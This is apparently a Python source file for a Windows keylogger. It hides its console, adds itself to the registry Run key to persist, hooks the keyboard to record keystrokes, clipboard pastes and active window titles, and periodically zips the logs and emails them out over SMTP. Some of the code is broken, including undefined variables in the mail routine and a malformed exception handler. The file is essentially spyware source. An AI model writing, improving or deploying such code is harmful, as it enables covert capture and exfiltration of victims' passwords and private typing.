# coding:utf-8
import ConfigParser
import os, zipfile
import sys
import threading
from os.path import join
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import email.MIMEImage  # import MIMEImage
import smtplib
import mimetypes
from ctypes import *
import datetime,time
import win32event, win32api, winerror
import win32clipboard
import win32process
import win32con
import pythoncom, pyHook
import gui

config = ConfigParser.ConfigParser()
with open('config.cfg', 'r') as cfgfile:
    config.readfp(cfgfile)

def getproperties(type, name):
    return config.get(type, name)
def saveproperties(type, name, value):
    config.set(type, name, value)
cfg_folder = getproperties('folder', 'folder')

reload(sys)
sys.setdefaultencoding("utf-8")
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

# Add to startup
def addStartup():
    path = sys.executable  # 要添加的exe路径
    name = path[path.rindex('\\') + 1:path.rindex('.')]  # 要添加的项值名称
    # 注册表项名
    KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    # 异常处理
    try:
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, KeyName, 0, win32con.KEY_ALL_ACCESS)
        win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
        win32api.RegCloseKey(key)
    except:
        print('error')

#zip file
def zip_folder(foldername, file_name):
    zip = zipfile.ZipFile(file_name, 'w', zipfile.ZIP_DEFLATED)
    for root, dirs, files in os.walk(foldername):
        for filename in files:
            zip.write(join(root, filename).encode("gbk"))
        if len(files) == 0:
            zif = zipfile.ZipInfo((root + '/').encode("gbk" + "/"))
            zip.writestr(zif, "")
    zip.close()

#Email Logs
class EmailClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def sendemail(self, file_name, subject):
        msg.attach(MIMEText(str(datetime.datetime.now()) + file_name + subject, 'plain', 'utf-8'))
        ctype, encoding = mimetypes.guess_type(file_name)
        if ctype is None or encoding is not None:
            ctype = 'application/octet-stream'
        maintype, subtype = ctype.split('/', 1)
        file_msg = email.MIMEImage.MIMEImage(open(file_name, 'rb').read(), subtype)
        basename = os.path.basename(file_name)
        file_msg.add_header('Content-Disposition', 'attachment', filename=basename)  # 修改邮件头
        msg.attach(file_msg)
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = subject
        server = smtplib.SMTP(smtp_server, 25)  # SMTP协议默认端口是25
        server.set_debuglevel(1)
        server.login(from_addr, password)
        server.sendmail(from_addr, [to_addr], msg.as_string())
        server.quit()
    def run(self):
        while not self.event.is_set():
            global cfg_folder
            i = datetime.datetime.now()
            if str(i.hour) == hour and str(i.minute) == minute:
                filename = cfg_folder + '.zip'
                if __name__ == "__main__":
                    try:
                        zip_folder(cfg_folder, filename)
                        self.sendemail(filename, '邮件')
                        time.sleep(60*60*24*int(day)-30)
                    except():
                        count += 1
                        if count >= 20:
                            break
                        if int(minute) > 45:
                            hour = str(int(hour)+1)
                            if int(hour) == 24:
                                hour = '00'
                            minute = '00'
                        else:
                            minute = str(int(minute)+10)
            self.event.wait(120)

#txt file writer
def filewriter(str1):
    #x = os.path.dirname(sys.executable) + '\\' + cfg_folder + '\\' + time.strftime('%Y-%m-%d',time.localtime(time.time())) + '.txt'
    x = os.path.dirname(os.path.realpath(__file__)) + '\\' + cfg_folder + '\\' + time.strftime('%Y-%m-%d', time.localtime(time.time())) + '.txt'
    f = open(x, 'a')
    f.write(str1)
    f.flush()

#
def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    windows_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(windows_title), 512)
    filewriter("\n" + "[ PID:%s-%s-%s]" % (process_id, executable.value, windows_title.value) + "\n")
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

#
def KeyStroke(event):
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
    if 32 < event.Ascii < 127:
        filewriter(chr(event.Ascii)),
    else:
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            filewriter("[PASTE]-%s" % pasted_value + "\n"),
        else:
            filewriter("[%s]" % event.Key),
    return True
''' 
def main():
    #addStartup()
    win = Tk() 
    app = App(win)  
    win.mainloop()

main() '''

def startlog():
    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke
    kl.HookKeyboard()
    pythoncom.PumpMessages()

startlog()


